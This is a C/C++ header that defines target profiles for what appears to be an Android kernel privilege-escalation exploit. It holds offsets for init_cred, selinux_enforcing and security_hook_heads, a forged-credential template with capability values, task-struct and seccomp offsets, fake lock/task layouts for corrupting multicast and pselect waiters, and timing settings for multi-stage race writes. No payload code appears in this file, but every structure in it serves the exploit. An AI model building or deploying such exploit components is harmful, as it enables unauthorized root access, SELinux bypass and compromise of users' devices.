#ifndef GHOSTLOCK_PROFILE_H
#define GHOSTLOCK_PROFILE_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
#include <array>
#include <cstring>
#endif

/* TODO(profile-suggest-01): Only kernel geometry (kernel_major, symbol and
 * struct offsets, waiter layout, credential template) is truly required. Every
 * non-core setting below is advisory: requires_shizuku, retry counts,
 * settle/timeout timings and recommended CPUs should be suggestions that a
 * user override or a shipped default can replace, and a profile that omits
 * them must still load. See docs/kernel_profiles/defaults*.md. */
struct execution_settings {
  uint32_t recommended_main_cpu, recommended_consumer_cpu;
  uint32_t heap_prepare_max_attempts, heap_prepare_timeout_ms;
  uint32_t heap_kernelsnitch_timeout_ms;
  uint32_t race_route_wait_ms, race_setup_settle_us;
  uint32_t race_state_poll_interval_us;
  uint32_t w1_attempts, w1_settle_us, w1_scratch_repair_attempts;
  uint32_t w2_attempts, w2_settle_us;
  uint32_t w3_chain_rounds, w3_attempts, w3_settle_us;
  uint32_t tcp_attempts, tcp_arm_sequence;
  uint32_t tcp_post_receive_hold_iterations;
  uint32_t select_enter_delay_us, select_timeout_us;
  uint32_t select_consumer_max_calls, select_consumer_burst_calls;
  uint32_t multicast_ready_timeout_ms, multicast_post_requeue_settle_us;
  uint32_t multicast_post_adjust_settle_us;
  uint32_t handoff_pre_dispatch_settle_ms, handoff_module_poll_attempts;
  uint32_t handoff_module_poll_interval_ms, handoff_enforce_poll_attempts;
  uint32_t handoff_enforce_poll_interval_ms;
};

/* Native transport representation of one Kotlin-resolved JSON profile.
 * S08 wraps this compatibility layout in an immutable TargetProfile. */
struct kernel_offsets {
  const char *uname_r;
  uint8_t kernel_major;
  uint8_t requires_shizuku;
  uint16_t _header_pad;
  uint64_t kernel_phys_load;
  int pselect_waiter_shift;
  int mcast_waiter_off;
  uint32_t mcast_buffer_size, mcast_task_offset, mcast_lock_offset;
  uint32_t mcast_fake_lock_offset, mcast_fake_task_offset;
  uint32_t mcast_lock_slots_offset, mcast_lock_slot_count, mcast_lock_slot_stride;
  uint32_t kernelsnitch_collisions;
  uint64_t off_init_task, off_init_cred, off_empty_zero_page;
  uint64_t off_mcast_fake_bss;
  uint64_t off_root_task_group, off_selinux_enforcing;
  uint64_t off_selinux_blob_sizes, off_security_hook_heads;
  uint64_t off_slide_nfulnl_logger, off_slide_loggers_0_1, off_slide_boot_id;
  uint32_t cred_copy_size, cred_usage_offset, cred_usage_value;
  uint32_t cred_caps_offset, cred_caps_count;
  uint64_t cred_caps_value;
  uint32_t cred_ref_count;
  uint32_t cred_ref0_offset, cred_ref1_offset;
  uint32_t cred_ref2_offset, cred_ref3_offset;
  uint64_t cred_ref0_image, cred_ref1_image;
  uint64_t cred_ref2_image, cred_ref3_image;
  uint32_t task_prio, task_normal_prio, task_sched_task_group;
  uint32_t task_pi_lock, task_pi_waiters, task_pi_top_task, task_pi_blocked_on;
  uint32_t task_pid, task_tgid, task_atomic_flags;
  uint32_t task_real_cred, task_cred, task_comm, task_tasks, task_seccomp;
  uint8_t compact_waiter;
  uint32_t mm_struct_sz;
  uint32_t _pad[3];
  struct execution_settings execution;
};

/* Immutable runtime snapshot copied from the JSON transport representation.
 * The C++ value owns uname_r and rebinds the transport pointer after every
 * copy/move. The C layout remains available as a compatibility façade. */
#ifdef __cplusplus
class TargetProfile final {
 public:
  TargetProfile() noexcept = default;

  explicit TargetProfile(const struct kernel_offsets &transport) noexcept
      : values_(transport), loaded_(true) {
    copy_release(transport.uname_r);
  }

  TargetProfile(const TargetProfile &other) noexcept
      : values_(other.values_), release_(other.release_),
        loaded_(other.loaded_) {
    rebind_release();
  }

  TargetProfile &operator=(const TargetProfile &other) noexcept {
    if (this != &other) {
      values_ = other.values_;
      release_ = other.release_;
      loaded_ = other.loaded_;
      rebind_release();
    }
    return *this;
  }

  TargetProfile(TargetProfile &&other) noexcept : TargetProfile(other) {}

  TargetProfile &operator=(TargetProfile &&other) noexcept {
    return *this = other;
  }

  [[nodiscard]] const struct kernel_offsets *values() const noexcept {
    return loaded_ ? &values_ : nullptr;
  }

  [[nodiscard]] bool loaded() const noexcept { return loaded_; }

 private:
  void copy_release(const char *release) noexcept {
    release_.fill('\0');
    if (release) {
      const size_t length = std::strlen(release);
      const size_t copied =
          length < release_.size() ? length : release_.size() - 1;
      std::memcpy(release_.data(), release, copied);
    }
    rebind_release();
  }

  void rebind_release() noexcept {
    values_.uname_r = loaded_ ? release_.data() : nullptr;
  }

  struct kernel_offsets values_{};
  std::array<char, 256> release_{};
  bool loaded_ = false;
};
#else
typedef struct target_profile {
  struct kernel_offsets values;
  int loaded;
} TargetProfile;
#endif

typedef struct multicast_waiter_layout {
  size_t waiter_offset, buffer_size, task_offset, lock_offset;
  size_t fake_lock_offset, fake_task_offset;
  size_t lock_slots_offset, lock_slot_count, lock_slot_stride;
  uint64_t fake_bss_image_offset;
} MulticastWaiterLayout;

typedef struct select_stack_layout {
  int waiter_shift;
  int compact_waiter;
} SelectStackLayout;

typedef struct tcp_zerocopy_layout {
  int compact_waiter;
} TcpZerocopyLayout;

static inline TargetProfile
target_profile_snapshot(const struct kernel_offsets *values) {
#ifdef __cplusplus
  return values ? TargetProfile(*values) : TargetProfile();
#else
  return values ? (TargetProfile){.values = *values, .loaded = 1}
                : (TargetProfile){0};
#endif
}

static inline const struct kernel_offsets *
target_profile_values(const TargetProfile *profile) {
#ifdef __cplusplus
  return profile ? profile->values() : nullptr;
#else
  return profile && profile->loaded ? &profile->values : NULL;
#endif
}

static inline int target_profile_is_loaded(const TargetProfile *profile) {
  return target_profile_values(profile) != NULL;
}

static inline const struct execution_settings *
target_profile_execution(const TargetProfile *profile) {
  const struct kernel_offsets *values = target_profile_values(profile);
  return values ? &values->execution : NULL;
}

static inline int target_profile_supports_multicast_waiter(
    const TargetProfile *profile) {
  const struct kernel_offsets *v = target_profile_values(profile);
  return v && v->kernel_major == 5 && v->mcast_waiter_off > 0;
}

static inline int target_profile_supports_tcp_zerocopy(
    const TargetProfile *profile) {
  const struct kernel_offsets *v = target_profile_values(profile);
  return v && v->compact_waiter;
}

static inline int target_profile_supports_select_stack(
    const TargetProfile *profile) {
  return target_profile_is_loaded(profile);
}

static inline int target_profile_has_compact_waiter(
    const TargetProfile *profile) {
  const struct kernel_offsets *v = target_profile_values(profile);
  return v && v->compact_waiter;
}

static inline MulticastWaiterLayout target_profile_multicast_waiter_layout(
    const TargetProfile *profile) {
  const struct kernel_offsets *v = target_profile_values(profile);
  return v ? (MulticastWaiterLayout){
      .waiter_offset = (size_t)v->mcast_waiter_off,
      .buffer_size = v->mcast_buffer_size,
      .task_offset = v->mcast_task_offset,
      .lock_offset = v->mcast_lock_offset,
      .fake_lock_offset = v->mcast_fake_lock_offset,
      .fake_task_offset = v->mcast_fake_task_offset,
      .lock_slots_offset = v->mcast_lock_slots_offset,
      .lock_slot_count = v->mcast_lock_slot_count,
      .lock_slot_stride = v->mcast_lock_slot_stride,
      .fake_bss_image_offset = v->off_mcast_fake_bss,
  } : (MulticastWaiterLayout){0};
}

static inline SelectStackLayout target_profile_select_stack_layout(
    const TargetProfile *profile) {
  const struct kernel_offsets *v = target_profile_values(profile);
  return v ? (SelectStackLayout){
      .waiter_shift = v->pselect_waiter_shift,
      .compact_waiter = v->compact_waiter,
  } : (SelectStackLayout){0};
}

static inline TcpZerocopyLayout target_profile_tcp_zerocopy_layout(
    const TargetProfile *profile) {
  return (TcpZerocopyLayout){
      .compact_waiter = target_profile_has_compact_waiter(profile),
  };
}

static inline uint32_t target_profile_u32(
    const TargetProfile *profile, uint32_t value, uint32_t fallback) {
  return target_profile_is_loaded(profile) && value ? value : fallback;
}

/* mm_struct stride; a missing or zero profile field uses the fallback. */
static inline uint32_t target_profile_mm_struct_sz(
    const TargetProfile *profile, uint32_t fallback) {
  const struct kernel_offsets *values = target_profile_values(profile);
  return target_profile_u32(profile, values ? values->mm_struct_sz : 0,
                            fallback);
}

static inline uint64_t target_profile_image(
    const TargetProfile *profile, uint64_t offset, uint64_t image_base,
    uint64_t fallback_offset) {
  return image_base +
      (target_profile_is_loaded(profile) && offset ? offset : fallback_offset);
}

#endif
